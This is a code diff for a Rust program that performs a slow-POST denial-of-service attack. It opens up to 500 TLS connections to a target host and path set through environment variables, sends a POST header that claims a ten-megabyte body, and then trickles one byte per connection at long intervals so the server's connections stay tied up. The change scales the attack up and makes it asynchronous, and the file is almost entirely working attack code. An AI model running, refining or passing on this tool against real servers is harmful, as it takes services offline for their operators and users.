@@ -1,51 +1,71 @@
 extern crate futures;
-extern crate futures_cpupool;
 extern crate native_tls;
 
 extern crate tokio_core;
 extern crate tokio_timer;
+extern crate tokio_tls;
 
 use native_tls::TlsConnector;
 use std::env;
 use std::io::Write;
-use std::net::TcpStream;
 use std::time::Duration;
 
+use std::io;
+use std::net::ToSocketAddrs;
+
 use futures::*;
-use tokio_core::reactor::{Core, Interval};
+use tokio_core::reactor::Core;
+use tokio_core::net::TcpStream;
+use tokio_tls::TlsConnectorExt;
 use tokio_timer::*;
 
 fn main() {
     let host = env::var("HOST").unwrap();
+    let path = env::var("POSTPATH").unwrap();
     let port = "443";
-    let timeout = 5;
-    let connections_count = 30;
+
+    let timeout = 50;
+    let connections_count = 500;
 
     let mut core = Core::new().unwrap();
     let handle = core.handle();
 
-    let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\n", host);
+    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\n", path, host);
     let timer = Timer::default();
+    let addr = format!("{}:{}", host, port).to_socket_addrs().unwrap().next().unwrap();
+
     for connection_number in 0..connections_count {
         let timer = timer.clone();
-        let connector = TlsConnector::builder().unwrap().build().unwrap();
-        let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
-        let mut stream = connector.connect(&host, stream).unwrap();
-        stream.write(start.as_bytes());
-        stream.flush();
+        let handle = handle.clone();
+        let host = host.clone();
+        let start = start.clone();
 
-        let lazy_wrapper = future::lazy(move || {
-            timer.interval(Duration::from_secs(timeout)).for_each(move |_| {
-                stream.write(b"a");
-                stream.flush();
+        let connector = TlsConnector::builder().unwrap().build().unwrap();
+        let socket = TcpStream::connect(&addr, &handle);
+
+        let handshake = socket.and_then(move |socket| {
+            connector.connect_async(&host, socket).map_err(|e| { io::Error::new(io::ErrorKind::Other, e) })
+        });
+
+        let outer_handle = handle.clone();
+        let connection = handshake.and_then(move |mut socket| {
+            let _start_written = socket.write(start.as_bytes());
+            let _start_flushed = socket.flush();
+
+            let interval = timer.interval(Duration::from_secs(timeout)).for_each(move |_| {
+                let _byte_written = socket.write(b"a");
+                let _byte_flushed = socket.flush();
                 println!("Stream number: {} written.", connection_number);
                 Ok(())
-            })
+            });
+            
+            handle.spawn(interval.map_err(|e| panic!("{}", e)));
+            println!("Stream number: {} spawned.", connection_number);
+            Ok(())
         });
-        let task = handle.spawn(lazy_wrapper.map_err(|_| panic!("HITHERE")));
-        println!("Stream number: {} spawned.", connection_number);
+        outer_handle.spawn(connection.map_err(|e| panic!("{}", e)));
     }
 
     let empty: futures::Empty<(), ()> = future::empty();
-    core.run(empty);
+    let _core_started = core.run(empty);
 }
